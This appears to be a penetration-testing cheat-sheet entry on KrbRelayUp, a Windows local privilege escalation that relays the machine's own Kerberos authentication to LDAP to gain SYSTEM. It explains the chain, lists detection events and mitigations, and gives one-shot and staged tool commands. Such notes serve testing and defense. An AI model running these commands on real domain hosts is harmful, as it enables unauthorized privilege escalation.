---
title: KrbRelayUp (local privesc)
category: AD / Delegation
order: 40
tags: [krbrelayup, kerberos-relay, rbcd, local-privesc, system]
summary: >
  A packaged local privilege escalation for domain-joined Windows: coerce the
  machine's own Kerberos auth, relay it to LDAP, write RBCD (or Shadow
  Credentials) on the local computer object, then S4U to SYSTEM. Works wherever
  LDAP signing/channel binding isn't enforced — the default.
prerequisites:
  - Unprivileged code execution on a domain-joined Windows host
  - LDAP signing AND channel binding NOT enforced on the DC (default)
  - MachineAccountQuota > 0, or an existing account with an SPN to delegate from
tools: [KrbRelayUp, KrbRelay, Rubeus]
detection:
  - Changes to msDS-AllowedToActOnBehalfOfOtherIdentity / msDS-KeyCredentialLink (5136) on the local computer
  - S4U2self/S4U2proxy (4769) then a new SYSTEM service
mitigation:
  - Enforce LDAP signing + LDAP channel binding (EPA) AND SMB signing; MachineAccountQuota = 0
refs:
  - { label: "Dec0ne/KrbRelayUp", url: "https://github.com/Dec0ne/KrbRelayUp" }
  - { label: "The Hacker Recipes — Kerberos relay", url: "https://www.thehacker.recipes/ad/movement/kerberos/" }
---

Not a distinct vulnerability — it automates a known chain. Local coercion makes
the host authenticate with Kerberos; that auth is relayed to LDAP on a DC and
used to write RBCD (or a key credential) onto the **local** computer object. Then
S4U yields a service ticket to the local machine as an admin → create a SYSTEM
service.

## One-shot

```powershell
KrbRelayUp.exe full -m rbcd -d $domain
# -> drops a controlled computer account, sets RBCD on self, S4U, spawns SYSTEM
```

## Staged

```powershell
KrbRelayUp.exe relay -m rbcd -cls <clsid>        # coerce + relay to LDAP, set RBCD
KrbRelayUp.exe spawn -m rbcd -d $domain -dc $dc_host -u 'EVIL$' -p 'pass'
```

> This is why **LDAP channel binding + signing** matters as much as SMB signing —
> without it, any local user on a domain-joined box has a generic path to SYSTEM.
